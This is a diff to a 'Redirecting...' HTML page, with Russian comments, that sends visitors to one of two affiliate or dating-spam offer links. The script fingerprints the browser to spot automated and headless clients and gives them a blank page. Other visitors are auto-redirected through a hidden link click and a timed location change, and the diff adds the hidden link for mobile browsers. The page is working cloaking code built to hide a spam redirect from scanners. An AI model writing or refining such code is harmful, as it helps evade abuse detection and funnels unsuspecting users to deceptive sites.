@@ -5,49 +5,45 @@
   <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
+  <style>
+    body {
+      background:#fff;
+      font-family: sans-serif;
+      text-align:center;
+      margin-top:40px;
+    }
+    #clicker {
+      display:none;
+    }
+  </style>
+
   <script>
     const offers = [
       "https://sisuny.top/click?o=2&a=6549&sub_id1=pysmom",
       "https://grzvkg.amurllove.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=212364&s2=2183582"
     ];
 
-    /* ------------------ АНТИБОТ ------------------ */
+    /* ---------- АНТИБОТ ---------- */
     function isBot() {
-      const ua = navigator.userAgent.toLowerCase();
-
-      // 1. Явный webdriver
       if (navigator.webdriver) return true;
-
-      // 2. Нет плагинов
       if (navigator.plugins.length === 0) return true;
-
-      // 3. Нет языков
       if (!navigator.languages || navigator.languages.length === 0) return true;
 
-      // 4. Headless браузеры
+      const ua = navigator.userAgent.toLowerCase();
       if (ua.includes("headless") || ua.includes("phantomjs")) return true;
 
-      // 5. WebGL → GPU
       try {
         const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        const gl = canvas.getContext("webgl");
         if (!gl) return true;
-
-        const ext = gl.getExtension("WEBGL_debug_renderer_info");
-        const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-
-        if (renderer) {
-          const badGPU = ["swiftshader", "mesa", "llvmpipe", "software"];
-          if (badGPU.some(g => renderer.toLowerCase().includes(g))) return true;
-        }
       } catch (e) {
         return true;
       }
 
-      return false; // человек
+      return false;
     }
 
-    /* ------------------ РАНДОМ ОФФЕРА ------------------ */
+    /* ---------- РАНДОМ ---------- */
     function hashString(str) {
       let h = 0;
       for (let i = 0; i < str.length; i++) {
@@ -57,30 +53,34 @@
       return Math.abs(h);
     }
 
-    const sessionSalt = Math.floor(Date.now() / (1000 * 60 * 20)); // 20 мин
+    const sessionSalt = Math.floor(Date.now() / (1000 * 60 * 15));
     const seed = navigator.userAgent + sessionSalt;
     const offerIndex = hashString(seed) % offers.length;
+    const targetURL = offers[offerIndex];
 
-    /* ------------------ РЕДИРЕКТ ------------------ */
-    function go() {
+    /* ---------- РЕДИРЕКТ ДЛЯ ANDROID + iOS ---------- */
+    function openLink() {
       if (isBot()) {
-        // бот → пустая страница
         window.location.replace("about:blank");
         return;
       }
 
-      const url = offers[offerIndex];
+      const a = document.getElementById("clicker");
+      a.href = targetURL;
+      a.click();
 
-      // мягкая задержка для реалистичности
       setTimeout(() => {
-        window.location.href = url;
-      }, 350);
+        window.location.href = targetURL;
+      }, 500);
     }
 
-    document.addEventListener("DOMContentLoaded", go);
+    document.addEventListener("DOMContentLoaded", () => {
+      setTimeout(openLink, 300);
+    });
   </script>
 </head>
 <body>
   <p>Redirecting...</p>
+  <a id="clicker" href="#" target="_self"></a>
 </body>
 </html>
